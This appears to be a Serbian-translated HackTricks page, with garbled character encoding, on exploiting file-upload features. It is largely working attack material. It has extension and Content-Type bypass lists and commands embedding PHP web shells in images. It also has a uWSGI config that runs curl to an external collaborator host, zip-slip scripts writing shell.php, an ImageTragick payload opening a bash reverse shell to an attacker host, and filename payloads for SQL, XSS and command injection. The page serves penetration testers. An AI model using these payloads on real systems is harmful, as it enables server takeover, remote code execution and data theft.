# File Upload

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ako ste zainteresovani za **hakersku karijeru** i hakovanje nehakovanog - **zapoÅ¡ljavamo!** (_potrebno je teÄno pisanje i govorenje poljskog_).

{% embed url="https://www.stmcyber.com/careers" %}

## OpÅ¡ta metodologija za upload fajlova

Ostale korisne ekstenzije:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Rad u PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### ZaobilaÅ¾enje provere ekstenzija fajlova

1. Ako se primenjuju, **proverite** **prethodne ekstenzije.** TakoÄ‘e ih testirajte koristeÄ‡i neka **velika slova**: _pHp, .pHP5, .PhAr ..._
2. _Proverite **dodavanje vaÅ¾eÄ‡e ekstenzije pre** ekstenzije za izvrÅ¡avanje (takoÄ‘e koristite prethodne ekstenzije):_
* _file.png.php_
* _file.png.Php5_
3. PokuÅ¡ajte dodati **specijalne karaktere na kraju.** MoÅ¾ete koristiti Burp za **bruteforce** sve **ascii** i **Unicode** karaktere. (_Napomena: takoÄ‘e moÅ¾ete pokuÅ¡ati da koristite **prethodno** pomenute **ekstenzije**_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. PokuÅ¡ajte da zaobiÄ‘ete zaÅ¡tite **prevarom parsera ekstenzije** na serverskoj strani koristeÄ‡i tehnike kao Å¡to su **dupliranje** **ekstenzije** ili **dodavanje junk** podataka (**null** bajtova) izmeÄ‘u ekstenzija. _TakoÄ‘e moÅ¾ete koristiti **prethodne ekstenzije** da pripremite bolji payload._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Dodajte **joÅ¡ jedan sloj ekstenzija** na prethodnu proveru:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. PokuÅ¡ajte staviti **exec ekstenziju pre vaÅ¾eÄ‡e ekstenzije** i molite se da je server pogreÅ¡no konfigurisan. (korisno za eksploataciju Apache pogreÅ¡nih konfiguracija gde bilo Å¡ta sa ekstenzijom\*\* _**.php**_**, ali** ne nuÅ¾no zavrÅ¡ava u .php\*\* Ä‡e izvrÅ¡iti kod):
* _ex: file.php.png_
7. KoriÅ¡Ä‡enje **NTFS alternativnog toka podataka (ADS)** u **Windows-u**. U ovom sluÄaju, karakter dvotaÄka â€œ:â€ Ä‡e biti umetnut nakon zabranjene ekstenzije i pre dozvoljene. Kao rezultat, **prazan fajl sa zabranjenom ekstenzijom** Ä‡e biti kreiran na serveru (npr. â€œfile.asax:.jpgâ€). Ovaj fajl moÅ¾e biti kasnije izmenjen koristeÄ‡i druge tehnike kao Å¡to je koriÅ¡Ä‡enje njegovog kratkog imena. Å ablon â€œ**::$data**â€ se takoÄ‘e moÅ¾e koristiti za kreiranje nepraznih fajlova. Stoga, dodavanje taÄke nakon ovog Å¡ablona moÅ¾e takoÄ‘e biti korisno za zaobilaÅ¾enje daljih ograniÄenja (.e.g. â€œfile.asp::$data.â€)
8.  PokuÅ¡ajte da prekinete ograniÄenja imena fajlova. VaÅ¾eÄ‡a ekstenzija se skraÄ‡uje. A zlonameran PHP ostaje. AAA<--SNIP-->AAA.php

```
# Linux maksimalno 255 bajtova
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 ovde i dodavanje .png
# UÄitajte fajl i proverite odgovor koliko karaktera dozvoljava. Recimo 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Napravite payload
AAA<--SNIP 232 A-->AAA.php.png
```

### ZaobilaÅ¾enje Content-Type, Magic Number, Kompresije i Promene veliÄine

* ZaobiÄ‘ite **Content-Type** provere postavljanjem **vrednosti** **Content-Type** **header-a** na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **reÄnik**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* ZaobiÄ‘ite **magic number** proveru dodavanjem na poÄetak fajla **bajtova pravog imidÅ¾a** (zbuniti _file_ komandu). Ili uvesti shell unutar **metapodataka**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ili takoÄ‘e moÅ¾ete **direktno uvesti payload** u sliku:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Ako se **kompresija dodaje vaÅ¡oj slici**, na primer koristeÄ‡i neke standardne PHP biblioteke kao Å¡to je [PHP-GD](https://www.php.net/manual/fr/book.image.php), prethodne tehnike neÄ‡e biti korisne. MeÄ‘utim, moÅ¾ete koristiti **PLTE chunk** [**tehnika definisana ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da umetnete neki tekst koji Ä‡e **preÅ¾iveti kompresiju**.
* [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Web stranica takoÄ‘e moÅ¾e **menjati veliÄinu** **slike**, koristeÄ‡i na primer PHP-GD funkcije `imagecopyresized` ili `imagecopyresampled`. MeÄ‘utim, moÅ¾ete koristiti **IDAT chunk** [**tehnika definisana ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da umetnete neki tekst koji Ä‡e **preÅ¾iveti kompresiju**.
* [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* JoÅ¡ jedna tehnika za pravljenje payload-a koji **preÅ¾ivljava promenu veliÄine slike**, koristeÄ‡i PHP-GD funkciju `thumbnailImage`. MeÄ‘utim, moÅ¾ete koristiti **tEXt chunk** [**tehnika definisana ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da umetnete neki tekst koji Ä‡e **preÅ¾iveti kompresiju**.
* [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Ostali trikovi za proveru

* PronaÄ‘ite ranjivost da **preimenujete** veÄ‡ otpremljeni fajl (da promenite ekstenziju).
* PronaÄ‘ite **Local File Inclusion** ranjivost da izvrÅ¡ite backdoor.
* **MoguÄ‡e otkrivanje informacija**:
1. UÄitajte **several times** (i u **isto vreme**) **isti fajl** sa **istim imenom**
2. UÄitajte fajl sa **imenom** **fajla** ili **foldera** koji **veÄ‡ postoji**
3. UÄitajte fajl sa **â€œ.â€, â€œ..â€, ili â€œâ€¦â€ kao njegovim imenom**. Na primer, u Apache-u u **Windows-u**, ako aplikacija Äuva otpremljene fajlove u â€œ/www/uploads/â€ direktorijumu, ime â€œ.â€ Ä‡e kreirati fajl pod nazivom â€œuploadsâ€ u â€œ/www/â€ direktorijumu.
4. UÄitajte fajl koji se moÅ¾da neÄ‡e lako obrisati kao Å¡to je **â€œâ€¦:.jpgâ€** u **NTFS**. (Windows)
5. UÄitajte fajl u **Windows** sa **nevaÅ¾eÄ‡im karakterima** kao Å¡to su `|<>*?â€` u njegovom imenu. (Windows)
6. UÄitajte fajl u **Windows** koristeÄ‡i **rezervisana** (**zabranjena**) **imena** kao Å¡to su CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, i LPT9.
* TakoÄ‘e pokuÅ¡ajte da **otpremite izvrÅ¡ni** (.exe) ili **.html** (manje sumnjiv) koji **Ä‡e izvrÅ¡iti kod** kada ga Å¾rtva sluÄajno otvori.

### Trikovi sa specijalnim ekstenzijama

Ako pokuÅ¡avate da otpremite fajlove na **PHP server**, [pogledajte **.htaccess** trik za izvrÅ¡avanje koda](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Ako pokuÅ¡avate da otpremite fajlove na **ASP server**, [pogledajte **.config** trik za izvrÅ¡avanje koda](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Fajlovi `.phar` su kao `.jar` za java, ali za php, i mogu se **koristiti kao php fajl** (izvrÅ¡avajuÄ‡i ga sa php, ili ukljuÄujuÄ‡i ga unutar skripte...)

Ekstenzija `.inc` se ponekad koristi za php fajlove koji se koriste samo za **uvoz fajlova**, tako da je u nekom trenutku neko mogao dozvoliti **da se ova ekstenzija izvrÅ¡ava**.

## **Jetty RCE**

Ako moÅ¾ete otpremiti XML fajl na Jetty server, moÅ¾ete dobiti [RCE jer se **novi \*.xml i \*.war automatski obraÄ‘uju**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Dakle, kao Å¡to je pomenuto na sledeÄ‡oj slici, otpremite XML fajl u `$JETTY_BASE/webapps/` i oÄekujte shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1047).png>)

## **uWSGI RCE**

Za detaljno istraÅ¾ivanje ove ranjivosti proverite originalno istraÅ¾ivanje: [uWSGI RCE Eksploatacija](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Ranjivosti daljinskog izvrÅ¡avanja komandi (RCE) mogu se eksploatisati na uWSGI serverima ako imate moguÄ‡nost da modifikujete `.ini` konfiguracioni fajl. uWSGI konfiguracioni fajlovi koriste specifiÄnu sintaksu za ukljuÄivanje "magic" varijabli, mesta i operatora. ZnaÄajno, operator '@', koriÅ¡Ä‡en kao `@(filename)`, je dizajniran da ukljuÄi sadrÅ¾aj fajla. MeÄ‘u raznim podrÅ¾anim Å¡emama u uWSGI, "exec" Å¡ema je posebno moÄ‡na, omoguÄ‡avajuÄ‡i Äitanje podataka iz standardnog izlaza procesa. Ova funkcija se moÅ¾e iskoristiti za zle svrhe kao Å¡to su daljinsko izvrÅ¡avanje komandi ili proizvoljno pisanje/Äitanje fajlova kada se obradi `.ini` konfiguracioni fajl.

Razmotrite sledeÄ‡i primer Å¡tetnog `uwsgi.ini` fajla, prikazujuÄ‡i razne Å¡eme:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
IzvrÅ¡enje payload-a se deÅ¡ava tokom parsiranja konfiguracione datoteke. Da bi konfiguracija bila aktivirana i parsirana, uWSGI proces mora biti ponovo pokrenut (potencijalno nakon pada ili zbog napada uskraÄ‡ivanja usluge) ili datoteka mora biti postavljena na automatsko ponovno uÄitavanje. Funkcija automatskog ponovnog uÄitavanja, ako je omoguÄ‡ena, ponovo uÄitava datoteku u odreÄ‘enim intervalima prilikom otkrivanja promena.

KljuÄno je razumeti labavu prirodu parsiranja konfiguracione datoteke uWSGI-a. Konkretno, pomenuti payload moÅ¾e biti umetnut u binarnu datoteku (kao Å¡to je slika ili PDF), dodatno proÅ¡irujuÄ‡i opseg potencijalne eksploatacije.

## **wget File Upload/SSRF Trick**

U nekim sluÄajevima moÅ¾ete primetiti da server koristi **`wget`** za **preuzimanje datoteka** i moÅ¾ete **navesti** **URL**. U ovim sluÄajevima, kod moÅ¾e proveravati da li je ekstenzija preuzetih datoteka unutar bele liste kako bi se osiguralo da se preuzimaju samo dozvoljene datoteke. MeÄ‘utim, **ova provera se moÅ¾e zaobiÄ‡i.**\
**Maksimalna** duÅ¾ina **imena datoteke** u **linux-u** je **255**, meÄ‘utim, **wget** skraÄ‡uje imena datoteka na **236** karaktera. MoÅ¾ete **preuzeti datoteku pod nazivom "A"\*232+".php"+".gif"**, ovo ime datoteke Ä‡e **zaobiÄ‡i** **proveru** (jer je u ovom primeru **".gif"** **vaÅ¾eÄ‡a** ekstenzija) ali Ä‡e `wget` **preimenovati** datoteku u **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
Napomena da **druga opcija** koju moÅ¾da razmiÅ¡ljate da zaobiÄ‘ete ovu proveru je da napravite **HTTP server preusmeri na drugu datoteku**, tako da Ä‡e inicijalni URL zaobiÄ‡i proveru, a zatim Ä‡e wget preuzeti preusmerenu datoteku sa novim imenom. Ovo **neÄ‡e raditi** **osim** ako se wget koristi sa **parametrom** `--trust-server-names` jer **wget Ä‡e preuzeti preusmerenu stranicu sa imenom datoteke naznaÄenim u originalnom URL-u**.

## Alati

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) je moÄ‡an alat dizajniran da pomogne Pentesterima i Lovcima na greÅ¡ke u testiranju mehanizama za uÄitavanje datoteka. Koristi razne tehnike nagraÄ‘ivanja greÅ¡aka kako bi pojednostavio proces identifikacije i eksploatacije ranjivosti, osiguravajuÄ‡i temeljne procene web aplikacija.

## Od uÄitavanja datoteka do drugih ranjivosti

* Postavite **ime datoteke** na `../../../tmp/lol.png` i pokuÅ¡ajte da postignete **putanju prelazaka**
* Postavite **ime datoteke** na `sleep(10)-- -.jpg` i moÅ¾da Ä‡ete moÄ‡i da postignete **SQL injekciju**
* Postavite **ime datoteke** na `<svg onload=alert(document.domain)>` da biste postigli XSS
* Postavite **ime datoteke** na `; sleep 10;` da biste testirali neku injekciju komandi (viÅ¡e [trikova za injekciju komandi ovde](../command-injection.md))
* [**XSS** u uploadu slike (svg) datoteke](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** datoteka **upload** + **XSS** = [**Eksploatacija servisnih radnika**](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE u uploadu svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Otvoreno preusmeravanje** putem uÄitavanja svg datoteke](../open-redirect.md#open-redirect-uploading-svg-files)
* PokuÅ¡ajte **razliÄite svg payloads** sa [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [Poznata **ImageTrick** ranjivost](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Ako moÅ¾ete **naznaÄiti web serveru da uhvati sliku sa URL-a** mogli biste pokuÅ¡ati da zloupotrebite [SSRF](../ssrf-server-side-request-forgery/). Ako Ä‡e ova **slika** biti **saÄuvana** na nekom **javnom** sajtu, mogli biste takoÄ‘e naznaÄiti URL sa [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **ukrasti informacije o svakom posetiocu**.
* [**XXE i CORS** zaobilaÅ¾enje sa PDF-Adobe uploadom](pdf-upload-xxe-and-cors-bypass.md)
* Posebno izraÄ‘eni PDF-ovi za XSS: [sledeÄ‡a stranica prikazuje kako da **ubacite PDF podatke da biste dobili izvrÅ¡enje JS**](../xss-cross-site-scripting/pdf-injection.md). Ako moÅ¾ete uÄitati PDF-ove, mogli biste pripremiti neki PDF koji Ä‡e izvrÅ¡iti proizvoljni JS prema datim uputstvima.
* UÄitajte \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) sadrÅ¾aj da proverite da li server ima neki **antivirus**
* Proverite da li postoji bilo kakvo **ograniÄenje veliÄine** prilikom uÄitavanja datoteka

Evo top 10 liste stvari koje moÅ¾ete postiÄ‡i uÄitavanjem (iz [ovde](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injekcija
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injekcija / XSS / Otvoreno preusmeravanje
8. **PNG / JPEG**: Pixel flood napad (DoS)
9. **ZIP**: RCE putem LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Ekstenzija

{% embed url="https://github.com/portswigger/upload-scanner" %}

## MagiÄni Header Bajtovi

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Pogledajte [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) za druge tipove datoteka.

### Zip/Tar datoteka automatski dekompresovana upload

Ako moÅ¾ete uÄitati ZIP koji Ä‡e biti dekompresovan unutar servera, moÅ¾ete uraditi 2 stvari:

#### Symlink

UÄitajte link koji sadrÅ¾i mekane linkove ka drugim datotekama, zatim, pristupajuÄ‡i dekompresovanim datotekama, imaÄ‡ete pristup povezanim datotekama:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decompress in different folders

NeoÄekivano kreiranje fajlova u direktorijumima tokom dekompresije je znaÄajan problem. I pored prvobitnih pretpostavki da bi ova postavka mogla da zaÅ¡titi od izvrÅ¡avanja komandi na nivou operativnog sistema putem malicioznih upload-ovanih fajlova, hijerarhijska podrÅ¡ka za kompresiju i moguÄ‡nosti prolaska kroz direktorijume ZIP arhivskog formata mogu se iskoristiti. To omoguÄ‡ava napadaÄima da zaobiÄ‘u ograniÄenja i pobegnu iz sigurnih upload direktorijuma manipuliÅ¡uÄ‡i funkcionalnoÅ¡Ä‡u dekompresije ciljne aplikacije.

Automatizovani exploit za kreiranje takvih fajlova dostupan je na [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Alat se moÅ¾e koristiti kao Å¡to je prikazano:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatno, **symlink trik sa evilarc** je opcija. Ako je cilj ciljati datoteku kao Å¡to je `/flag.txt`, treba kreirati symlink ka toj datoteci u vaÅ¡em sistemu. Ovo osigurava da evilarc ne naiÄ‘e na greÅ¡ke tokom svog rada.

Ispod je primer Python koda koji se koristi za kreiranje malicioznog zip fajla:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Zloupotreba kompresije za file spraying**

Za viÅ¡e detalja **proverite originalni post na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Kreiranje PHP Shell-a**: PHP kod je napisan da izvrÅ¡ava komande prosleÄ‘ene kroz `$_REQUEST` promenljivu.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2.  **File Spraying i kreiranje komprimovanih fajlova**: ViÅ¡e fajlova se kreira i zip arhiva se sastavlja koja sadrÅ¾i ove fajlove.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3.  **Izmena pomoÄ‡u Hex Editora ili vi**: Imena fajlova unutar zip-a se menjaju koristeÄ‡i vi ili hex editor, menjajuÄ‡i "xxA" u "../" da bi se pretraÅ¾ivali direktorijumi.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Otpremite ovaj sadrÅ¾aj sa ekstenzijom slike da biste iskoristili ranjivost **(ImageMagick , 7.0.1-1)** (iz [eksploita](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## UgraÄ‘ivanje PHP Shell-a u PNG

UgraÄ‘ivanje PHP shell-a u IDAT deo PNG datoteke moÅ¾e efikasno zaobiÄ‡i odreÄ‘ene operacije obrade slika. Funkcije `imagecopyresized` i `imagecopyresampled` iz PHP-GD su posebno relevantne u ovom kontekstu, jer se obiÄno koriste za promenu veliÄine i ponovo uzorkovanje slika, redom. Sposobnost ugraÄ‘enog PHP shell-a da ostane nepromenjen ovim operacijama je znaÄajna prednost za odreÄ‘ene sluÄajeve upotrebe.

Detaljna istraÅ¾ivanja ove tehnike, ukljuÄujuÄ‡i njenu metodologiju i potencijalne primene, pruÅ¾ena su u sledeÄ‡em Älanku: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ovaj resurs nudi sveobuhvatno razumevanje procesa i njegovih implikacija.

ViÅ¡e informacija na: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Poliglot datoteke

Poliglot datoteke sluÅ¾e kao jedinstveni alat u sajber bezbednosti, delujuÄ‡i kao kameleoni koji mogu validno postojati u viÅ¡e formata datoteka istovremeno. Zanimljiv primer je [GIFAR](https://en.wikipedia.org/wiki/Gifar), hibrid koji funkcioniÅ¡e i kao GIF i kao RAR arhiva. Takve datoteke nisu ograniÄene na ovu kombinaciju; kombinacije poput GIF i JS ili PPT i JS su takoÄ‘e izvodljive.

Osnovna korisnost poliglot datoteka leÅ¾i u njihovoj sposobnosti da zaobiÄ‘u bezbednosne mere koje filtriraju datoteke na osnovu tipa. UobiÄajena praksa u raznim aplikacijama podrazumeva dozvoljavanje samo odreÄ‘enih tipova datoteka za uploadâ€”poput JPEG, GIF ili DOCâ€”kako bi se smanjio rizik od potencijalno Å¡tetnih formata (npr. JS, PHP ili Phar datoteka). MeÄ‘utim, poliglot, prilagoÄ‘avajuÄ‡i se strukturnim kriterijumima viÅ¡e tipova datoteka, moÅ¾e tiho zaobiÄ‡i ova ograniÄenja.

I pored svoje prilagodljivosti, poligloti se suoÄavaju sa ograniÄenjima. Na primer, dok poliglot moÅ¾e istovremeno predstavljati PHAR datoteku (PHp ARchive) i JPEG, uspeh njegovog upload-a moÅ¾e zavisiti od politika ekstenzija datoteka platforme. Ako je sistem strog u vezi sa dozvoljenim ekstenzijama, sama strukturna dualnost poliglota moÅ¾da neÄ‡e biti dovoljna da garantuje njegov upload.

ViÅ¡e informacija na: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Reference

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ako ste zainteresovani za **hakersku karijeru** i da hakujete ono Å¡to se ne moÅ¾e hakovati - **zapoÅ¡ljavamo!** (_potrebno je teÄno pisano i govorno poljski_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
